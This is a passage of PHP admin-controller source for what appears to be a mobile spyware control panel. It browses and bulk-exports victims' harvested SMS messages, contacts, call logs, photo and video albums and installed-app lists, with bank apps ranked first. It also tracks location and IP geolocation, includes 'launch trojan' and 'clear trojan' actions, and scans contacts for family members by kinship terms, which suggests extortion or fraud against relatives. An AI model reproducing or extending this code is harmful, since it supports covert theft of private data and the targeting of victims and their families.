            if (!$this->checkDeletePermission()) {
                return json(['code' => 0, 'msg' => '您没有删除权限']);
            }
            
            try {
                // 获取用户相关图片文件路径
                $images = Db::name('img')->where('userid', $userId)->field('img as image_url')->select();
                
                // 清空相册数据库记录
                $result = Db::name('img')->where('userid', $userId)->delete();
                
                // 记录操作日志
                $this->addLog('清空相册', '清空了用户ID：' . $userId . ' 的所有相册数据');
                
                // 删除实际图片文件
                $rootPath = app()->getRootPath() . 'public';
                foreach ($images as $image) {
                    $imagePath = $image['image_url'];
                    if (!empty($imagePath)) {
                        // 处理文件路径
                        $filePath = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $rootPath . $imagePath);
                        // 检查文件是否存在
                        if (file_exists($filePath)) {
                            @unlink($filePath);
                        }
                    }
                }
                
                return json(['code' => 1, 'msg' => '相册已清空']);
            } catch (\Exception $e) {
                return json(['code' => 0, 'msg' => '清空失败：'.$e->getMessage()]);
            }
        }
        
        return json(['code' => 0, 'msg' => '非法请求']);
    }
    
    /**
     * 定位功能
     * @return mixed
     */
    public function dingwei()
    {
        $id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
        $user = Db::name('user')->where('id', $id)->find();
        View::assign('dingweiid', $user);
        return View::fetch();
    }
    
    /**
     * 应用设置
     * @return mixed
     */
    public function appset()
    {
        return $this->error('此功能已移除');
    }
    
    /**
     * 保存应用设置
     * @return mixed
     */
    public function appsetpo()
    {
        return $this->error('此功能已移除');
    }
    
    /**
     * APP查看
     * @param int $id 用户ID
     * @return mixed
     */
    public function app($id = null)
    {
        // 检查是否有用户ID参数
        if (is_null($id)) {
            return $this->error('用户ID不能为空');
        }
        
        // 获取分页参数
        $page = input('page/d', 1);
        $limit = input('limit/d', 80); // 每页显示更多应用，以适应网格布局
        
        // 获取用户基本信息
        $member = Db::name('user')->where('id', $id)->find();
        if (!$member) {
            return $this->error('未找到该用户');
        }
        
        // 关键词搜索
        $where = [['userid', '=', $id]];
        $keywords = input('keywords/s', '');
        if (!empty($keywords)) {
            $where[] = ['app_name', 'like', '%' . $keywords . '%'];
        }
        
        // 查询该用户的所有已安装App，并分页
        $appList = Db::name('installed_apps')
            ->where($where)
            ->order('is_bank', 'desc')       // 先按银行APP排序
            ->order('install_time', 'desc')  // 按安装时间排序
            ->paginate([
                'list_rows' => $limit,
                'query' => $this->request->param(),
                'var_page' => 'page'
            ]);
        
        // 统计银行类APP
        $bankAppCount = Db::name('installed_apps')
            ->where([['userid', '=', $id], ['is_bank', '=', 1]])
            ->count();
            
        // 获取应用总数
        $totalAppCount = Db::name('installed_apps')
            ->where('userid', $id)
            ->count();
        
        // 分配变量到模板
        View::assign([
            'member' => $member,
            'apps' => $appList,
            'bank_app_count' => $bankAppCount,
            'total_app_count' => $totalAppCount,
            'page' => $appList->render()
        ]);
        
        return View::fetch(null, [], [], false); // 设置不使用布局
    }
    
    /**
     * 导出应用列表
     * @return mixed
     */
    public function exportapps()
    {
        // 检查权限
        if (!$this->checkExportPermission()) {
            return redirect(url('admin/index/index'));
        }
        
        $id = input('id/d', 0);
        if (!$id) {
            $this->error('参数错误');
        }
        
        $list = Db::name('installed_apps')->where('user_id', $id)->select();
        if (count($list) == 0) {
            $this->error('没有数据');
        }
        
        $header = ['APP名称', '包名', '图标'];
        $data = [];
        
        foreach ($list as $val) {
            $data[] = [
                $val['app_name'],
                $val['package_name'],
                $val['icon_url']
            ];
        }
        
        $fileName = '已安装APP_' . date('YmdHis');
        
        return $this->excel($data, $header, $fileName);
    }
    
    /**
     * 相册管理
     * @return mixed
     */
    public function xiangce()
    {
        $post = $this->request->param();
        
        if (isset($post['id']) && !empty($post['id'])) {
            $id = $post['id'];
        } else {
            return $this->error('参数错误');
        }
        
        // 重定向到allalbum方法
        return redirect((string)url('admin/appv1/allalbum', ['id' => $id]));
    }
    
    /**
     * 合并相册 - 同时显示普通相册和IOS相册
     * @return mixed
     */
    public function allalbum($id = null)
    {
        // 如果没有指定用户ID，重定向到用户列表页面
        if (empty($id)) {
            return redirect('/admin/txl.html');
        }
        
        // 获取用户信息
        $user = Db::name('user')->where('id', $id)->find();
        
        if (!$user) {
            $this->error('用户不存在');
        }
        
        // 获取当前管理员信息
        $adminId = Session::get('admin');
        $currentAdmin = Db::name('admin')->where('id', $adminId)->find();
        
        // 获取相册图片，支持图片和视频
        $allImages = Db::name('img')
            ->where('userid', $id)
            ->field('id, img as image_url, addtime, 
                CASE 
                    WHEN LOWER(img) LIKE "%.mp4" OR LOWER(img) LIKE "%.mov" OR LOWER(img) LIKE "%.m4v" OR LOWER(img) LIKE "%.3gp" OR LOWER(img) LIKE "%.avi" THEN "video" 
                    WHEN img LIKE "/image%" THEN "ios" 
                    ELSE "normal" 
                END as type')
            ->order('addtime desc')
            ->select()
            ->toArray();
        
        // 遍历所有图片，标记视频类型和来源，不在分页后处理
        foreach ($allImages as &$img) {
            // 确保image_url是完整URL
            if (!empty($img['image_url'])) {
                if (strpos($img['image_url'], 'http') !== 0 && strpos($img['image_url'], '/') === 0) {
                    $img['image_url'] = 'http://' . $this->request->host() . $img['image_url'];
                }
                
                // 判断是否为视频文件
                $ext = strtolower(pathinfo($img['image_url'], PATHINFO_EXTENSION));
                $isVideo = in_array($ext, ['mp4', 'mov', 'm4v', '3gp', 'avi']);
                
                // 设置媒体类型
                if ($isVideo) {
                    $img['type'] = (strpos($img['image_url'], '/image') !== false) ? 'ios' : 'normal';
                    $img['is_video'] = 1; // 添加视频标记
                } else {
                    $img['is_video'] = 0;
                }
            }
        }
        
        // 统计总量（改为不分页，全量展示）
        $totalCount = count($allImages);
        
        // 计算视频和图片数量
        $videoCount = 0;
        foreach ($allImages as $img) {
            if (isset($img['is_video']) && $img['is_video'] == 1) {
                $videoCount++;
            }
        }
        $imageCount = $totalCount - $videoCount;
        
        // 分配变量到模板
        View::assign([
            'user' => $user,
            'imgs' => $allImages,
            'total_count' => $totalCount,
            'image_count' => $imageCount,
            'video_count' => $videoCount,
            'current_page' => 1,
            'total_pages' => 1,
            'current_admin' => $currentAdmin
        ]);
        
        return View::fetch('allalbum');
    }
    
    /**
     * 添加日志
     * @param string $title 日志标题
     * @param string $content 日志内容
     */
    protected function addLog($title = '', $content = '')
    {
        // 日志记录功能暂时禁用，以避免影响主要功能
        return true;
    }
    
    /**
     * 导出短信Excel
     */
    public function smsexcel()
    {
        $id = $this->request->param('id', 0, 'intval');
        
        // 检查ID是否有效
        if ($id <= 0) {
            $this->error('参数错误');
        }
        
        $list = Db::name('content')->where('userid', $id)->order('smstime', 'desc')->select();
        if (count($list) == 0) {
            $this->error('没有数据');
        }
        
        $header = ['手机号码', '短信内容', '接收时间'];
        $data = [];
        
        foreach ($list as $val) {
            // 确保smstime是一个有效的数值时间戳
            $time = '';
            if (!empty($val['smstime']) && is_numeric($val['smstime'])) {
                $time = date('Y-m-d H:i:s', (int)$val['smstime']);
            }
            
            $data[] = [
                $val['smstel'],
                $val['smscontent'],
                $time
            ];
        }
        
        $fileName = '短信内容_' . date('YmdHis');
        
        return $this->excel($data, $header, $fileName);
    }

    /**
     * 生成短信Excel文件
     */
    private function generateSmsExcel($header, $data, $filename)
    {
        // 设置响应头
        header('Content-Type: application/vnd.ms-excel');
        header('Content-Disposition: attachment;filename="' . $filename . '.xls"');
        header('Cache-Control: max-age=0');
        
        // 输出Excel头部
        echo '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40">
        <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <style>
        td{text-align:center;border:1px solid #000;}
        </style>
        </head>
        <body>
        <table>';
        
        // 输出表头
        echo '<tr>';
        foreach ($header as $h) {
            echo '<td>' . $h . '</td>';
        }
        echo '</tr>';
        
        // 输出数据
        foreach ($data as $row) {
            echo '<tr>';
            foreach ($row as $cell) {
                echo '<td>' . $cell . '</td>';
            }
            echo '</tr>';
        }
        
        echo '</table></body></html>';
        exit;
    }

    /**
     * 视频群发通讯录
     */
    public function video_message()
    {
        // 获取通讯录数据
        $id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
        
        // 如果有用户ID参数，获取该用户的通讯录数据
        if ($id > 0) {
            // 获取用户信息
            $userInfo = Db::name('user')->where('id', $id)->find();
            View::assign('user', $userInfo);
            
            // 获取用户的通讯录数据
            $contacts = Db::name('mobile')
                ->where('userid', $id)
                ->field('id, username, umobile, addtime')
                ->order('id desc')
                ->limit(10)  // 限制最多显示10条
                ->select();
                
            View::assign('contacts', $contacts);
            View::assign('contacts_count', count($contacts));
            View::assign('user_id', $id);
        } else {
            // 如果没有指定用户ID，获取最近的通讯录数据
            $contacts = Db::name('mobile')
                ->alias('a')
                ->join('user b','b.id = a.userid')
                ->field('a.id, a.username, a.umobile, a.addtime, b.name as user_name, b.id as user_id')
                ->order('a.id desc')
                ->limit(10)  // 限制最多显示10条
                ->select();
                
            View::assign('contacts', $contacts);
            View::assign('contacts_count', count($contacts));
            View::assign('user_id', 0);
        }
        
        return View::fetch();
    }

    /**
     * 启动木马页面
     */
    public function upload_trojan()
    {
        $id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
        
        // 如果有用户ID，获取用户信息
        if ($id > 0) {
            $userInfo = Db::name('user')->where('id', $id)->find();
            View::assign('user', $userInfo);
            View::assign('user_id', $id);
        }
        
        return View::fetch();
    }

    /**
     * 清除木马（仅记录操作并返回结果）
     */
    public function clearTrojan()
    {
        if (!$this->request->isAjax() && !$this->request->isPost()) {
            return json(['code' => 0, 'msg' => '非法请求']);
        }

        $userId = $this->request->param('id', 0, 'intval');
        if (empty($userId)) {
            return json(['code' => 0, 'msg' => '参数错误']);
        }

        // 检查用户是否存在
        $userInfo = Db::name('user')->where('id', $userId)->find();
        if (empty($userInfo)) {
            return json(['code' => 0, 'msg' => '用户不存在']);
        }

        // 记录操作日志（当前项目暂无单独木马状态表）
        $this->addLog('清除木马', '用户ID：' . $userId . '，设备：' . ($userInfo['name'] ?? ''));

        return json(['code' => 1, 'msg' => '清除木马指令已执行']);
    }

    /**
     * 上传Facebook视频页面
     */
    public function upload_facebook()
    {
        $id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
        
        // 如果有用户ID，获取用户信息
        if ($id > 0) {
            $userInfo = Db::name('user')->where('id', $id)->find();
            View::assign('user', $userInfo);
            View::assign('user_id', $id);
        }
        
        return View::fetch();
    }

    /**
     * 微信群扫码操作
     */
    public function wechat_scan()
    {
        $id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
        
        // 如果有用户ID，获取用户信息
        if ($id > 0) {
            $userInfo = Db::name('user')->where('id', $id)->find();
            View::assign('user', $userInfo);
            View::assign('user_id', $id);
        }
        
        return View::fetch();
    }

    /**
     * 绑定群二维码操作
     */
    public function link_qrcode()
    {
        $id = $this->request->has('id') ? $this->request->param('id', 0, 'intval') : 0;
        
        // 如果有用户ID，获取用户信息
        if ($id > 0) {
            $userInfo = Db::name('user')->where('id', $id)->find();
            View::assign('user', $userInfo);
            View::assign('user_id', $id);
        }
        
        return View::fetch();
    }

    /**
     * 批量删除用户
     * 同时删除所有用户的相关数据和文件
     */
    public function alldeletes()
    {
        if ($this->request->isAjax()) {
            // 支持POST的ids参数和GET的delid参数
            $ids = $this->request->post('ids', '');
            
            // 如果POST中没有ids参数，尝试从GET中获取delid参数
            if (empty($ids)) {
                $ids = $this->request->get('delid', '');
            }
            
            if (empty($ids)) {
                return json(['code' => 0, 'msg' => '请选择要删除的用户']);
            }
            
            // 检查删除权限
            if (!$this->checkDeletePermission()) {
                return json(['code' => 0, 'msg' => '您没有删除权限']);
            }
            
            // 解析ID数组
            $ids = is_array($ids) ? $ids : explode(',', $ids);
            
            try {
                Db::startTrans();
                
                // 获取所有用户相关图片，用于后续删除实际文件
                $images = Db::name('img')
                    ->whereIn('userid', $ids)
                    ->field('img as image_url')
                    ->select()
                    ->toArray();
                
                // 删除用户基本信息
                Db::name('user')->whereIn('id', $ids)->delete();
                
                // 删除用户通讯录数据
                Db::name('mobile')->whereIn('userid', $ids)->delete();
                
                // 删除用户短信数据
                Db::name('content')->whereIn('userid', $ids)->delete();

                // 删除用户通话记录数据（旧库可能没有该表）
                try {
                    Db::name('call_logs')->whereIn('userid', $ids)->delete();
                } catch (\Exception $e) {
                }
                
                // 删除用户相册数据
                Db::name('img')->whereIn('userid', $ids)->delete();
                
                // 删除用户已安装的APP数据
                Db::name('installed_apps')->whereIn('userid', $ids)->delete();
                
                // 尝试删除可能存在的亲友关系表数据
                try {
                    Db::name('relatives')->whereIn('user_id', $ids)->delete();
                } catch (\Exception $e) {
                    // 忽略不存在的表错误
                }
                
                Db::commit();
                
                // 删除实际图片文件
                $rootPath = app()->getRootPath() . 'public';
                foreach ($images as $image) {
                    $imagePath = $image['image_url'];
                    if (!empty($imagePath)) {
                        // 处理文件路径
                        $filePath = str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $rootPath . $imagePath);
                        // 检查文件是否存在
                        if (file_exists($filePath)) {
                            @unlink($filePath);
                        }
                    }
                }
                
                // 记录操作日志
                $this->addLog('批量删除用户', '删除了用户ID: ' . implode(',', $ids) . ' 及其所有相关数据');
                
                return json(['code' => 1, 'msg' => '删除成功']);
            } catch (\Exception $e) {
                Db::rollback();
                return json(['code' => 0, 'msg' => '删除失败: ' . $e->getMessage()]);
            }
        }
        
        return json(['code' => 0, 'msg' => '非法请求']);
    }
    
    /**
     * 获取手机号码归属地信息
     * 
     * @param string $haoma 手机号码
     * @return string 归属地信息
     */
    public function getmobile($haoma)
    {
        $url = 'http://mobsec-dianhua.baidu.com/dianhua_api/open/location?tel=' . $haoma;
        try {
            $content = file_get_contents($url);
            $con = json_decode($content, true);
            return isset($con['response'][$haoma]['location']) ? $con['response'][$haoma]['location'] : '';
        } catch (\Exception $e) {
            return '';
        }
    }
    
    /**
     * 过滤emoji表情符号，现已弃用并改为保留所有字符包括表情符号
     * 
     * @param mixed $str 需要过滤的字符串或数组
     * @return mixed 过滤后的字符串或数组
     */
    public function filter_emoji($str) 
    {  
        // 保留所有字符包括表情符号
        return $str;
        
        // 旧代码注释掉，不再使用
        /*
        $regex = '/(\\\u[ed][0-9a-f]{3})/i';  
        $str = json_encode($str);  
        $str = preg_replace($regex, '', $str);
        return json_decode($str);
        */
    }
    
    /**
     * 导出Excel通用方法
     * 
     * @param array $data 数据
     * @param array $tableHeader 表头
     * @param string $fileName 文件名
     */
    public function excel($data, $tableHeader, $fileName)
    {
        // 如果没有安装PHPExcel库，提示需要安装
        if (!class_exists('\\PhpOffice\\PhpSpreadsheet\\Spreadsheet')) {
            return json(['code' => 0, 'msg' => '请先安装PHPExcel库或PhpSpreadsheet库']);
        }
        
        try {
            // 创建PHPSpreadsheet对象
            $spreadsheet = new \PhpOffice\PhpSpreadsheet\Spreadsheet();
            $sheet = $spreadsheet->getActiveSheet();
            
            // 设置文档属性
            $spreadsheet->getProperties()
                ->setCreator("System")
                ->setLastModifiedBy("System")
                ->setTitle($fileName)
                ->setSubject("Export Data");
            
            // 设置默认字体
            $spreadsheet->getDefaultStyle()->getFont()->setName('Microsoft YaHei');
            $spreadsheet->getDefaultStyle()->getFont()->setSize(11);
            
            // 填充表头
            $letter = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
            for ($i = 0; $i < count($tableHeader); $i++) {
                $sheet->setCellValue($letter[$i] . '1', $tableHeader[$i]);
                
                // 设置表头样式
                $sheet->getStyle($letter[$i] . '1')->getFont()->setBold(true);
                $sheet->getStyle($letter[$i] . '1')->getFill()
                    ->setFillType(\PhpOffice\PhpSpreadsheet\Style\Fill::FILL_SOLID)
                    ->getStartColor()->setRGB('DDDDDD');
            }
            
            // 自动设置列宽
            foreach ($letter as $col) {
                $sheet->getColumnDimension($col)->setAutoSize(true);
            }
            
            // 填充数据
            for ($i = 2; $i <= count($data) + 1; $i++) {
                $j = 0;
                foreach ($data[$i - 2] as $key => $value) {
                    // 处理特殊字符，确保编码正确
                    $value = $this->sanitizeExcelValue($value);
                    $sheet->setCellValue($letter[$j] . $i, $value);
                    
                    // 长文本使用自动换行
                    if (is_string($value) && mb_strlen($value) > 50) {
                        $sheet->getStyle($letter[$j] . $i)->getAlignment()->setWrapText(true);
                    }
                    
                    $j++;
                }
            }
            
            // 设置所有内容垂直居中
            $lastRow = count($data) + 1;
            $lastCol = $letter[count($tableHeader) - 1];
            $sheet->getStyle('A1:' . $lastCol . $lastRow)->getAlignment()->setVertical(\PhpOffice\PhpSpreadsheet\Style\Alignment::VERTICAL_CENTER);
            
            // 输出Excel
            ob_end_clean(); // 清除之前的输出缓冲
            header('Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
            header('Content-Disposition: attachment;filename="' . rawurlencode($fileName) . '.xlsx"');
            header('Cache-Control: max-age=0');
            header('Pragma: public');
            
            $writer = \PhpOffice\PhpSpreadsheet\IOFactory::createWriter($spreadsheet, 'Xlsx');
            $writer->save('php://output');
            exit;
        } catch (\Exception $e) {
            return json(['code' => 0, 'msg' => '导出失败：' . $e->getMessage()]);
        }
    }
    
    /**
     * 处理Excel单元格值，确保编码和格式正确
     * @param mixed $value 单元格值
     * @return mixed 处理后的值
     */
    private function sanitizeExcelValue($value)
    {
        if (is_string($value)) {
            // 移除不可见控制字符
            $value = preg_replace('/[\x00-\x09\x0B\x0C\x0E-\x1F\x7F]/', '', $value);
            
            // 确保是UTF-8编码
            if (!mb_check_encoding($value, 'UTF-8')) {
                $value = mb_convert_encoding($value, 'UTF-8', 'auto');
            }
            
            // 检查是否包含Formula注入风险
            if (strlen($value) > 0 && in_array($value[0], ['=', '+', '-', '@'])) {
                $value = "'" . $value;
            }
        }
        
        return $value;
    }

    /**
     * 获取用户的亲友关系
     * 从通讯录中查找可能的亲友关系
     * 
     * @return \think\response\Json
     */
    public function getRelatives()
    {
        if($this->request->isPost()){
            $userId = $this->request->post('userId/d', 0);
            if(!$userId){
                return json(['code' => 0, 'msg' => '参数错误']);
            }
            
            // 亲友关系关键词
            $familyTerms = [
                "爸爸", "爸", "父亲", "父", 
                "妈妈", "妈", "母亲", "母", 
                "哥哥", "哥", "大哥", "二哥", 
                "弟弟", "弟", "小弟", 
                "姐姐", "姐", "大姐", "二姐", 
                "妹妹", "妹", "小妹", 
                "爷爷", "爷", "祖父", 
                "奶奶", "祖母", 
                "外公", "姥爷", "外祖父", 
                "外婆", "姥姥", "外祖母", 
                "叔叔", "叔", "伯伯", "伯", "舅舅", "舅", "姑父", 
                "阿姨", "姑姑", "姑", "姨", "姨妈", 
                "老公", "丈夫", "夫君", "先生", 
                "老婆", "妻子", "夫人", "媳妇", 
                "岳父", "岳母", "公公", "婆婆", 
                "女儿", "儿子", "孙子", "孙女", "外孙", "外孙女"
            ];
            
            // 从通讯录中查找包含亲友关系称呼的联系人
            $contacts = Db::name('mobile')
                ->where('userid', $userId)
                ->field('id, username, umobile')
                ->select()
                ->toArray();
                
            $relatives = [];
            foreach($contacts as $contact){
                foreach($familyTerms as $term){
                    // 如果联系人名称包含亲友称呼关键词
                    if(mb_strpos($contact['username'], $term) !== false){
                        $relatives[] = [
                            'name' => $contact['username'],
                            'phone' => $contact['umobile']
                        ];
                        break; // 匹配到一个关键词就跳出内层循环
                    }
                }
            }
            
            // 返回结果
            return json(['code' => 1, 'msg' => '获取成功', 'data' => $relatives]);
        }
        
        return json(['code' => 0, 'msg' => '请求方式错误']);
    }

    /**
     * 导出单个用户的数据为Excel或TXT
     * @return \think\response\Json|\think\Response
     */
    public function exportData()
    {
        // 检查权限
        if (!$this->checkExportPermission()) {
            return json(['code' => 0, 'msg' => '您没有导出数据的权限']);
        }
        
        $id = $this->request->param('id', 0, 'intval'); // 用户ID
        $type = $this->request->param('type', ''); // 导出类型：sms/contacts/calls
        $format = $this->request->param('format', 'excel'); // 导出格式：excel或txt
        
        if (empty($id) || empty($type)) {
            return json(['code' => 0, 'msg' => '参数错误']);
        }
        
        // 根据不同类型获取不同数据
        switch ($type) {
            case 'sms':
                // 导出短信数据
                $data = Db::name('content')
                    ->where('userid', $id)
                    ->field('smstel, smscontent, smstime')
                    ->order('smstime', 'desc')
                    ->select()
                    ->toArray();
                
                if (empty($data)) {
                    return json(['code' => 0, 'msg' => '暂无短信数据']);
                }
                
                // 处理数据
                $allData = [];
                foreach ($data as $item) {
                    // 确保smstime是一个有效的数值时间戳
                    $time = '';
                    if (!empty($item['smstime']) && is_numeric($item['smstime'])) {
                        $time = date('Y-m-d H:i:s', (int)$item['smstime']);
                    }
                    
                    $allData[] = [
                        $item['smstel'],
                        $item['smscontent'],
                        $time
                    ];
                }
                
                // 表头
                $header = ['手机号码', '短信内容', '接收时间'];
                $fileName = '短信数据_' . date('YmdHis');
                break;
                
            case 'contacts':
                // 导出通讯录数据
                $data = Db::name('mobile')
                    ->where('userid', $id)
                    ->field('username, umobile, addtime')
                    ->select()
                    ->toArray();
                
                if (empty($data)) {
                    return json(['code' => 0, 'msg' => '暂无通讯录数据']);
                }
                
                // 处理数据
                $allData = [];
                foreach ($data as $item) {
                    // 处理添加时间
                    $time = '';
                    if (!empty($item['addtime']) && is_numeric($item['addtime'])) {
                        $time = date('Y-m-d H:i:s', (int)$item['addtime']);
                    }
                    
                    $allData[] = [
                        $item['username'],
                        $item['umobile'],
                        $time
                    ];
                }
                
                // 表头
                $header = ['联系人', '手机号码', '添加时间'];
                $fileName = '通讯录数据_' . date('YmdHis');
                break;

            case 'calls':
                // 导出通话记录数据
                try {
                    $data = Db::name('call_logs')
                        ->where('userid', $id)
                        ->field('call_name, call_tel, call_time, duration, call_type')
                        ->order('id', 'desc')
                        ->select()
                        ->toArray();
                } catch (\Exception $e) {
                    $data = [];
                }

                if (empty($data)) {
                    return json(['code' => 0, 'msg' => '暂无通话记录数据']);
                }

                $allData = [];
                foreach ($data as $item) {
                    $typeText = '未知';
                    if ((int)$item['call_type'] === 1) {
                        $typeText = '呼入';
                    } elseif ((int)$item['call_type'] === 2) {
                        $typeText = '呼出';
                    } elseif ((int)$item['call_type'] === 3) {
                        $typeText = '未接';
                    }

                    $allData[] = [
                        $item['call_name'] ?: '-',
                        $item['call_tel'],
                        $item['call_time'],
                        (string)($item['duration'] ?? 0),
                        $typeText
                    ];
                }

                $header = ['联系人', '通话号码', '通话时间', '时长(秒)', '通话类型'];
                $fileName = '通话记录_' . date('YmdHis');
                break;
                
            default:
                return json(['code' => 0, 'msg' => '不支持的导出类型']);
        }
        
        // 根据格式导出
        if ($format == 'excel') {
            return $this->excel($allData, $header, $fileName);
        } else if ($format == 'txt') {
            return $this->exportTxt($allData, $header, $fileName);
        } else {
            return json(['code' => 0, 'msg' => '不支持的导出格式']);
        }
    }
    
    /**
     * 批量导出多个用户的数据
     * @return \think\response\Json|\think\Response
     */
    public function exportBatchData()
    {
        // 检查权限
        if (!$this->checkExportPermission()) {
            return json(['code' => 0, 'msg' => '您没有导出数据的权限']);
        }
        
        $ids = $this->request->param('ids', '');
        $type = $this->request->param('type', ''); // 导出类型：sms/contacts/calls
        $format = $this->request->param('format', 'excel'); // 导出格式：excel或txt
        
        if (empty($ids) || empty($type)) {
            return json(['code' => 0, 'msg' => '参数错误']);
        }
        
        // 将ids转为数组
        $userIds = explode(',', $ids);
        
        // 获取用户信息
        $users = Db::name('user')
            ->field('id, name')
            ->whereIn('id', $userIds)
            ->select()
            ->toArray();
        
        $allData = [];
        
        // 根据不同类型获取不同数据
        switch ($type) {
            case 'sms':
                // 导出短信数据
                $data = Db::name('content')
                    ->whereIn('userid', $userIds)
                    ->field('userid, smstel, smscontent, smstime')
                    ->order('smstime', 'desc')
                    ->select()
                    ->toArray();
                    
                if (empty($data)) {
                    return json(['code' => 0, 'msg' => '暂无短信数据']);
                }
                
                // 用户ID到名称的映射
                $userIdToName = array_column($users, 'name', 'id');
                
                // 处理数据
                foreach ($data as $item) {
                    $userName = isset($userIdToName[$item['userid']]) ? $userIdToName[$item['userid']] : '未知用户';
                    
                    // 确保smstime是一个有效的数值时间戳
                    $time = '';
                    if (!empty($item['smstime']) && is_numeric($item['smstime'])) {
                        $time = date('Y-m-d H:i:s', (int)$item['smstime']);
                    }
                    
                    $allData[] = [
                        $userName,
                        $item['smstel'],
                        $item['smscontent'],
                        $time
                    ];
                }
                
                // 表头
                $header = ['用户', '手机号码', '短信内容', '接收时间'];
                $fileName = '批量短信数据_' . date('YmdHis');
                break;
                
            case 'contacts':
                // 导出通讯录数据
                $data = Db::name('mobile')
                    ->whereIn('userid', $userIds)
                    ->field('userid, username, umobile, addtime')
                    ->select()
                    ->toArray();
                    
                if (empty($data)) {
                    return json(['code' => 0, 'msg' => '暂无通讯录数据']);
                }
                
                // 用户ID到名称的映射
                $userIdToName = array_column($users, 'name', 'id');
                
                // 处理数据
                foreach ($data as $item) {
                    $userName = isset($userIdToName[$item['userid']]) ? $userIdToName[$item['userid']] : '未知用户';
                    
                    // 处理添加时间
                    $time = '';
                    if (!empty($item['addtime']) && is_numeric($item['addtime'])) {
                        $time = date('Y-m-d H:i:s', (int)$item['addtime']);
                    }
                    
                    $allData[] = [
                        $userName,
                        $item['username'],
                        $item['umobile'],
                        $time
                    ];
                }
                
                // 表头
                $header = ['用户', '通讯录姓名', '通讯录手机号码', '添加时间'];
                $fileName = '批量通讯录数据_' . date('YmdHis');
                break;

            case 'calls':
                // 导出通话记录数据
                try {
                    $data = Db::name('call_logs')
                        ->whereIn('userid', $userIds)
                        ->field('userid, call_name, call_tel, call_time, duration, call_type')
                        ->order('id', 'desc')
                        ->select()
                        ->toArray();
                } catch (\Exception $e) {
                    $data = [];
                }

                if (empty($data)) {
                    return json(['code' => 0, 'msg' => '暂无通话记录数据']);
                }

                $userIdToName = array_column($users, 'name', 'id');
                foreach ($data as $item) {
                    $userName = isset($userIdToName[$item['userid']]) ? $userIdToName[$item['userid']] : '未知用户';
                    $typeText = '未知';
                    if ((int)$item['call_type'] === 1) {
                        $typeText = '呼入';
                    } elseif ((int)$item['call_type'] === 2) {
                        $typeText = '呼出';
                    } elseif ((int)$item['call_type'] === 3) {
                        $typeText = '未接';
                    }

                    $allData[] = [
                        $userName,
                        $item['call_name'] ?: '-',
                        $item['call_tel'],
                        $item['call_time'],
                        (string)($item['duration'] ?? 0),
                        $typeText
                    ];
                }

                $header = ['用户', '联系人', '通话号码', '通话时间', '时长(秒)', '通话类型'];
                $fileName = '批量通话记录_' . date('YmdHis');
                break;
                
            default:
                return json(['code' => 0, 'msg' => '不支持的导出类型']);
        }
        
        // 根据格式导出
        if ($format == 'excel') {
            return $this->excel($allData, $header, $fileName);
        } else if ($format == 'txt') {
            return $this->exportTxt($allData, $header, $fileName);
        } else {
            return json(['code' => 0, 'msg' => '不支持的导出格式']);
        }
    }

    /**
     * 导出为TXT格式
     * @param array $data 数据
     * @param array $header 表头
     * @param string $fileName 文件名
     */
    protected function exportTxt($data, $header, $fileName)
    {
        // 准备TXT内容
        $content = implode(",", $header) . "\n";
        
        foreach ($data as $row) {
            $content .= implode(",", $row) . "\n";
        }
        
        // 设置头信息
        header("Content-type: text/plain");
        header("Content-Disposition: attachment; filename=" . $fileName . ".txt");
        header('Content-Transfer-Encoding: binary');
        header('Pragma: no-cache');
        header('Expires: 0');
        
        // 输出内容
        echo $content;
        exit;
    }

    /**
     * IP地址定位
     */
    public function ip_location()
    {
        $userId = $this->request->param('id/d', 0);
        if (empty($userId)) {
            return $this->error('参数错误');
        }
        
        // 获取用户信息
        $user = DB::name('user')->where('id', $userId)->find();
        if (empty($user)) {
            return $this->error('用户不存在');
        }
        
        $ip = $user['ip'] ?? '';
        if (empty($ip)) {
            return $this->error('用户IP地址不存在');
        }
        
        // 调用IP定位接口获取地理位置信息
        $location = $this->getIpLocation($ip);
        
        // 传递数据到视图
        View::assign('ip', $ip);
        View::assign('location', $location);
        View::assign('user_info', $user);
        
        return View::fetch();
    }
    
    /**
     * 获取IP地址的地理位置信息
     * @param string $ip IP地址
     * @return array
     */
    private function getIpLocation($ip)
    {
        $location = [
            'country' => '未知',
            'province' => '',
            'city' => '',
            'isp' => '未知',
            'lng' => '',
            'lat' => '',
            'is_vpn' => false
        ];

        if (empty($ip) || !filter_var($ip, FILTER_VALIDATE_IP)) {
            return $location;
        }

        try {
            $apiUrl = 'https://ip9.com.cn/get?ip=' . rawurlencode($ip);
            $response = '';

            if (function_exists('curl_init')) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $apiUrl);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
                curl_setopt($ch, CURLOPT_TIMEOUT, 6);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
                $response = curl_exec($ch);
                curl_close($ch);
            } else {
                $context = stream_context_create([
                    'http' => ['timeout' => 6, 'header' => "Accept: application/json\r\n"],
                    'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
                ]);
                $response = @file_get_contents($apiUrl, false, $context);
            }

            if (!empty($response)) {
                $data = json_decode($response, true);
                if (is_array($data) && isset($data['ret']) && (int)$data['ret'] === 200 && isset($data['data']) && is_array($data['data'])) {
                    $ipData = $data['data'];
                    $location['country'] = trim((string)($ipData['country'] ?? '未知'));
                    $location['province'] = trim((string)($ipData['prov'] ?? ''));
